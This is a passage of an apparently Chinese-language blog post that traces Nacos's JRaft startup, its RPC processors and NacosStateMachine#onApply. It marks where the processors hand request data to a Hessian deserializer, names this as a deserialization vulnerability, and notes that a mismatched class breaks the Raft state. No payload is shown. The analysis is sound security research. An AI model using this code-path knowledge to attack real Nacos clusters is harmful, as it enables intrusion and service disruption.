class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (!isStarted) &#123;<br>        Loggers.RAFT.info(<span class="hljs-string">&quot;========= The raft protocol is starting... =========&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// init raft group node</span><br>            com.alipay.sofa.jraft.<span class="hljs-type">NodeManager</span> <span class="hljs-variable">raftNodeManager</span> <span class="hljs-operator">=</span> com.alipay.sofa.jraft.NodeManager.getInstance();<br>            <span class="hljs-keyword">for</span> (String address : raftConfig.getMembers()) &#123;<br>                <span class="hljs-type">PeerId</span> <span class="hljs-variable">peerId</span> <span class="hljs-operator">=</span> PeerId.parsePeer(address);<br>                conf.addPeer(peerId);<br>                raftNodeManager.addAddress(peerId.getEndpoint());<br>            &#125;<br>            nodeOptions.setInitialConf(conf);<br>            <span class="hljs-comment">//调用至JRaftUtils#initRpcServer()</span><br>            rpcServer = JRaftUtils.initRpcServer(<span class="hljs-built_in">this</span>, localPeerId);<br>            <br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.rpcServer.init(<span class="hljs-literal">null</span>)) &#123;<br>                Loggers.RAFT.error(<span class="hljs-string">&quot;Fail to init [BaseRpcServer].&quot;</span>);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Fail to init [BaseRpcServer].&quot;</span>);<br>            &#125;<br>            <br>            <span class="hljs-comment">// Initialize multi raft group service framework</span><br>            isStarted = <span class="hljs-literal">true</span>;<br>            createMultiRaftGroup(processors);<br>            Loggers.RAFT.info(<span class="hljs-string">&quot;========= The raft protocol start finished... =========&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;raft protocol start failure, cause: &quot;</span>, e);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JRaftUtils#initRpcServer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> RpcServer <span class="hljs-title function_">initRpcServer</span><span class="hljs-params">(JRaftServer server, PeerId peerId)</span> &#123;<br><br>...<br>    <span class="hljs-comment">//注册自定义 Rpc 请求处理器</span><br>    rpcServer.registerProcessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosWriteRequestProcessor</span>(server, SerializeFactory.getDefault()));<br>    rpcServer.registerProcessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosReadRequestProcessor</span>(server, SerializeFactory.getDefault()));<br>    <br>    <span class="hljs-keyword">return</span> rpcServer;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="RpcProcessor"><a href="#RpcProcessor" class="headerlink" title="RpcProcessor"></a>RpcProcessor</h3><p>Rpc 请求处理器，只有当业务通讯也使用sofa-jraft提供的RpcServer才需要。可以实现com.alipay.sofa.jraft.rpc.RpcProcessor接口，根据目标请求参数，处理业务请求。<br>可看出 Nacos 使用的 RpcProcessor 为NacosWriteRequestProcessor 和 NacosReadRequestProcessor<br>NacosWriteRequestProcessor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosWriteRequestProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RpcProcessor</span>&lt;WriteRequest&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">INTEREST_NAME</span> <span class="hljs-operator">=</span> WriteRequest.class.getName();<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> JRaftServer server;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NacosWriteRequestProcessor</span><span class="hljs-params">(JRaftServer server, Serializer serializer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(serializer);<br>        <span class="hljs-built_in">this</span>.server = server;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(RpcContext rpcCtx, WriteRequest request)</span> &#123;<br>        <span class="hljs-comment">//调用至父类即 AbstractProcessor#handleRequest()方法</span><br>        handleRequest(server, request.getGroup(), rpcCtx, request);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">interest</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> INTEREST_NAME;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>NacosWriteRequestProcessor 继承 AbstractProcessor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractProcessor</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Serializer serializer;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AbstractProcessor</span><span class="hljs-params">(Serializer serializer)</span> &#123;<br>        <span class="hljs-built_in">this</span>.serializer = serializer;<br>    &#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JRaftServer server, <span class="hljs-keyword">final</span> String group, <span class="hljs-keyword">final</span> RpcContext rpcCtx, Message message)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> JRaftServer.<span class="hljs-type">RaftGroupTuple</span> <span class="hljs-variable">tuple</span> <span class="hljs-operator">=</span> server.findTupleByGroup(group);<br>            <span class="hljs-keyword">if</span> (Objects.isNull(tuple)) &#123;<br>                rpcCtx.sendResponse(Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>)<br>                        .setErrMsg(<span class="hljs-string">&quot;Could not find the corresponding Raft Group : &quot;</span> + group).build());<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//判断是否为 Leader</span><br>            <span class="hljs-keyword">if</span> (tuple.getNode().isLeader()) &#123;<br>                <span class="hljs-comment">//此处后续调用至自定义状态机</span><br>                execute(server, rpcCtx, message, tuple);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                rpcCtx.sendResponse(<br>                        Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(<span class="hljs-string">&quot;Could not find leader : &quot;</span> + group).build());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;handleRequest has error : &quot;</span>, e);<br>            rpcCtx.sendResponse(Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(e.toString()).build());<br>        &#125;<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>com.alipay.sofa.jraft.core.#isLeader() 此处获取State.STATE_LEADER</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLeader</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> isLeader(<span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLeader</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> blocking)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!blocking) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.state == State.STATE_LEADER;<br>    &#125;<br>    <span class="hljs-built_in">this</span>.readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.state == State.STATE_LEADER;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-built_in">this</span>.readLock.unlock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="状态机"><a href="#状态机" class="headerlink" title="状态机"></a>状态机</h3><p>使用sofa-jraft需要实现自己的StateMachine，Nacos使用得状态机为 NacosStateMachine<br>最重要的方法是onApply方法。当Node提交Task，对应的log被提交到Raft集群后，当quorum节点成功commit log，触发这个方法来应用状态（当前节点存储数据）。CounterStateMachine在onApply方法中，执行原子计数器的相关功能，包括get和addAndGet。<br>com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup() 启动RaftServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createMultiRaftGroup</span><span class="hljs-params">(Collection&lt;RequestProcessor4CP&gt; processors)</span> &#123;<br>    <span class="hljs-comment">// There is no reason why the LogProcessor cannot be processed because of the synchronization</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isStarted) &#123;<br>        <span class="hljs-built_in">this</span>.processors.addAll(processors);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">parentPath</span> <span class="hljs-operator">=</span> Paths.get(EnvUtil.getNacosHome(), <span class="hljs-string">&quot;data/protocol/raft&quot;</span>).toString();<br>    <br>    <span class="hljs-keyword">for</span> (RequestProcessor4CP processor : processors) &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">groupName</span> <span class="hljs-operator">=</span> processor.group();<br>        <span class="hljs-keyword">if</span> (multiRaftGroup.containsKey(groupName)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DuplicateRaftGroupException</span>(groupName);<br>        &#125;<br>        <br>        <span class="hljs-comment">//确保每个Raft Group都有自己的配置和NodeOptions</span><br>        <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> conf.copy();<br>        <span class="hljs-type">NodeOptions</span> <span class="hljs-variable">copy</span> <span class="hljs-operator">=</span> nodeOptions.copy();<br>        JRaftUtils.initDirectory(parentPath, groupName, copy);<br>        <br>        <span class="hljs-comment">// Here, the LogProcessor is passed into StateMachine, and when the StateMachine</span><br>        <span class="hljs-comment">// triggers onApply, the onApply of the LogProcessor is actually called</span><br>        <span class="hljs-comment">//processors 传递给StateMachine，当StateMachine</span><br><span class="hljs-comment">//触发onApply，实际调用 processors的onApply()</span><br>        <span class="hljs-type">NacosStateMachine</span> <span class="hljs-variable">machine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosStateMachine</span>(<span class="hljs-built_in">this</span>, processor);<br>        <br>        copy.setFsm(machine);<br>        copy.setInitialConf(configuration);<br>            <br>        <span class="hljs-comment">// Set snapshot interval, default 1800 seconds</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">doSnapshotInterval</span> <span class="hljs-operator">=</span> ConvertUtils.toInt(raftConfig.getVal(RaftSysConstants.RAFT_SNAPSHOT_INTERVAL_SECS),<br>                RaftSysConstants.DEFAULT_RAFT_SNAPSHOT_INTERVAL_SECS);<br>        <br>        <span class="hljs-comment">// If the business module does not implement a snapshot processor, cancel the snapshot</span><br>        doSnapshotInterval = CollectionUtils.isEmpty(processor.loadSnapshotOperate()) ? <span class="hljs-number">0</span> : doSnapshotInterval;<br>        <br>        copy.setSnapshotIntervalSecs(doSnapshotInterval);<br>        Loggers.RAFT.info(<span class="hljs-string">&quot;create raft group : &#123;&#125;&quot;</span>, groupName);<br>        <span class="hljs-type">RaftGroupService</span> <span class="hljs-variable">raftGroupService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaftGroupService</span>(groupName, localPeerId, copy, rpcServer, <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//启动</span><br>        <span class="hljs-comment">// Because BaseRpcServer has been started before, it is not allowed to start again here</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> raftGroupService.start(<span class="hljs-literal">false</span>);<br>        machine.setNode(node);<br>        RouteTable.getInstance().updateConfiguration(groupName, configuration);<br>        <br>        RaftExecutor.executeByCommon(() -&gt; registerSelfToCluster(groupName, localPeerId, configuration));<br>        <br>        <span class="hljs-comment">// Turn on the leader auto refresh for this group</span><br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">period</span> <span class="hljs-operator">=</span> nodeOptions.getElectionTimeoutMs() + random.nextInt(<span class="hljs-number">5</span> * <span class="hljs-number">1000</span>);<br>        RaftExecutor.scheduleRaftMemberRefreshJob(() -&gt; refreshRouteTable(groupName),<br>                nodeOptions.getElectionTimeoutMs(), period, TimeUnit.MILLISECONDS);<br>        multiRaftGroup.put(groupName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaftGroupTuple</span>(node, processor, raftGroupService, machine));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JRaftServer#createMultiRaftGroup()  传入参数类为 RequestProcessor4CP，此类存在5个实现类，其中以下三个为<code>@Component</code>为注解注释类</p><ul><li>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl</li><li>com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor</li><li>com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor</li></ul><p>以上三个类构造方法中均调用 JRaftProtocol#addRequestProcessors() 方法，最终调用至JRaftServer#createMultiRaftGroup()，故调用顺序为 NacosStateMachine#onApply() 后调用至以上三个类的 onApply() 方法。<br>NacosStateMachine#onApply()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onApply</span><span class="hljs-params">(Iterator iter)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">applied</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    Message message;<br>    <span class="hljs-type">NacosClosure</span> <span class="hljs-variable">closure</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">while</span> (iter.hasNext()) &#123;<br>            <span class="hljs-type">Status</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> Status.OK();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (iter.done() != <span class="hljs-literal">null</span>) &#123;<br>                    closure = (NacosClosure) iter.done();<br>                    message = closure.getMessage();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> iter.getData();<br>                    message = ProtoMessageUtil.parse(data.array());<br>                    <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> ReadRequest) &#123;<br>                        <span class="hljs-comment">//&#x27;iter.done() == null&#x27; means current node is follower, ignore read operation</span><br>                        applied++;<br>                        index++;<br>                        iter.next();<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                &#125;<br>                <br>                LoggerUtils.printIfDebugEnabled(Loggers.RAFT, <span class="hljs-string">&quot;receive log : &#123;&#125;&quot;</span>, message);<br><br>                <span class="hljs-comment">//判断类型是否为 WriteRequest 是则进入if</span><br>                <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> WriteRequest) &#123;<br>                    <span class="hljs-comment">//调用上面三个实现类的 onApply() 方法</span><br>                    <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> processor.onApply((WriteRequest) message);<br>                    postProcessor(response, closure);<br>                &#125;<br>                <br>                <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> ReadRequest) &#123;<br>                    <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> processor.onRequest((ReadRequest) message);<br>                    postProcessor(response, closure);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>                index++;<br>                status.setError(RaftError.UNKNOWN, e.toString());<br>                Optional.ofNullable(closure).ifPresent(closure1 -&gt; closure1.setThrowable(e));<br>                <span class="hljs-keyword">throw</span> e;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                Optional.ofNullable(closure).ifPresent(closure1 -&gt; closure1.run(status));<br>&#125;<br>            applied++;<br>            index++;<br>            iter.next();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;processor : &#123;&#125;, stateMachine meet critical error: &#123;&#125;.&quot;</span>, processor, t);<br>            <span class="hljs-comment">//若 processor#onApply() 则设置 State 为State.STATE_ERROR</span><br>        iter.setErrorAndRollback(index - applied,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Status</span>(RaftError.ESTATEMACHINE, <span class="hljs-string">&quot;StateMachine meet critical error: %s.&quot;</span>,<br>                            ExceptionUtil.getStackTrace(t)));<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br><span class="hljs-comment">//此处调用至 HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br><span class="hljs-comment">//此处接收类为 InstanceStoreRequest，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br><span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">InstanceStoreRequest</span> <span class="hljs-variable">instanceRequest</span> <span class="hljs-operator">=</span> serializer.deserialize(request.getData().toByteArray());<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">DataOperation</span> <span class="hljs-variable">operation</span> <span class="hljs-operator">=</span> DataOperation.valueOf(request.getOperation());<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> readLock;<br>    lock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">switch</span> (operation) &#123;<br>            <span class="hljs-keyword">case</span> ADD:<br>                onInstanceRegister(instanceRequest.service, instanceRequest.instance,<br>                        instanceRequest.getClientId());<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> DELETE:<br>                onInstanceDeregister(instanceRequest.service, instanceRequest.getClientId());<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> CHANGE:<br>                <span class="hljs-keyword">if</span> (instanceAndServiceExist(instanceRequest)) &#123;<br>                    onInstanceRegister(instanceRequest.service, instanceRequest.instance,<br>                            instanceRequest.getClientId());<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(<span class="hljs-string">&quot;unsupport operation : &quot;</span> + operation)<br>                        .build();<br>        &#125;<br>    &#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        lock.unlock();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//public static final NAMING_PERSISTENT_SERVICE_GROUP_V2 = &quot;naming_persistent_service_v2&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//NAMING_PERSISTENT_SERVICE_GROUP_V2 = &quot;naming_persistent_service_v2&quot;;</span><br>    <span class="hljs-keyword">return</span> Constants.NAMING_PERSISTENT_SERVICE_GROUP_V2;<br>&#125;<br></code></pre></td></tr></table></figure><p> com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor#onApply()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br><span class="hljs-comment">////此处调用至 HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br><span class="hljs-comment">//此处接收类为 MetadataOperation&lt;InstanceMetadata&gt;，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br><span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    MetadataOperation&lt;InstanceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);<br>    readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>    ....<br>        &#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        Loggers.RAFT.error(<span class="hljs-string">&quot;onApply &#123;&#125; instance metadata operation failed. &quot;</span>, request.getOperation(), e);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span> == e.getMessage() ? e.getClass().getName() : e.getMessage();<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(errorMessage).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        readLock.unlock();<br>    &#125;<br>&#125;<br>    <br><span class="hljs-comment">//    public static final String INSTANCE_METADATA = &quot;naming_instance_metadata&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Constants.SERVICE_METADATA;<br>&#125;<br></code></pre></td></tr></table></figure><p> com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApply()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br><span class="hljs-comment">//此处调用至 